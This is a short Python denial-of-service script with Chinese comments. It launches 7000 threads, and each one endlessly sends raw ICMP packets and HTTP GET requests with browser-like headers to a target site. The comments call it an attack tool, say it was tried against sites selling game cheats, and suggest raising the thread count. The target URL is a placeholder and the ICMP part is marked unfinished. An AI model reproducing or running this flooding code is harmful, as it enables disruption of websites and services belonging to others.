import threading
import requests
import socket

"""
一個簡單的測試網站
無使用代理
個人電腦對有一定規模的網站
攻擊效果有限
(目前只測試過販賣外掛的網站)
"""

def TCPURL():
    url = [
        "#",
    ]
    return url

def ICMPIP():

    url = TCPURL()[0].split("//")[1].split("/")[0]
    Ip = socket.gethostbyname(url)
    return Ip

def hd():
    header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
        "cache-control": "no-cache",
        "sec-fetch-mode": "no-cors",
        "sec-fetch-site": "same-origin"
    }
    return header

def get():

    ip = ICMPIP()
    icmp_request = b"\x08\x00\x7d\x4b\x00\x00\x00\x00"

    while True:
        try:
            for i in range(len(TCPURL())):
                # 未完成的
                icmp = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                icmp.sendto(icmp_request, (ip, 0))

                data = requests.get(TCPURL()[i],headers=hd())
                print(f"state:{data}")
                data.text
        except Exception as e:
            print(f"debug:{e}")
            continue

for i in range(7000): # 可根據自身電腦加大力度
    threading.Thread(target=get).start()